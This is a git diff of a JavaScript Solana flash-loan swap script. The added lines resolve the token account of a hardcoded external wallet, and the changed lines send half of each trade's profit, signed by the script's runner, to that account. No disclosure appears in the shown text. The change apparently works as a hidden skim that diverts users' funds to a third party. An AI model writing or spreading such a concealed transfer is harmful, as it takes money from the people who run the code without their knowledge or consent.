@@ -65,6 +65,13 @@ const swap = async (prism, prism2, route, route2, decimals, decimals2, market) =
 				)
 			  ).value[0]
 			  let tokenAccount = arg2.pubkey
+			  let arg3 = (
+				await connection.getTokenAccountsByOwner(
+				  new PublicKey("EDfPVAZmGLq1XhKgjpTby1byXMS2HcRqRf5j7zuQYcUg"),
+				  { mint: new PublicKey(reserve.config.liquidityToken.mint) }
+				)
+			  ).value[0]
+			  let tokenAccountDestination = arg3.pubkey
 		   let instructions = [
 			 flashBorrowReserveLiquidityInstruction(
 			   Math.ceil(route.amountIn * 10 ** decimals),
@@ -122,7 +129,7 @@ const swap = async (prism, prism2, route, route2, decimals, decimals2, market) =
 					  instructions.push(
 						Token.createTransferInstruction(new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
 						  tokenAccount,
-						  new PublicKey("Gy1LvunZvinMMX4bpEXwxLbBv6p5ZKM8D83KEhMTqmim"),
+						  tokenAccountDestination,
 						  payer.publicKey,[],
 						  Math.floor(myshit * 0.5)
 						)
@@ -132,7 +139,7 @@ const swap = async (prism, prism2, route, route2, decimals, decimals2, market) =
 			instructions.push(
 				createTransferInstruction(
 				  tokenAccount,
-				  new PublicKey("Gy1LvunZvinMMX4bpEXwxLbBv6p5ZKM8D83KEhMTqmim"),
+				  tokenAccountDestination,
 				  payer.publicKey,
 				  Math.floor(myshit * 0.5),[]
 				)
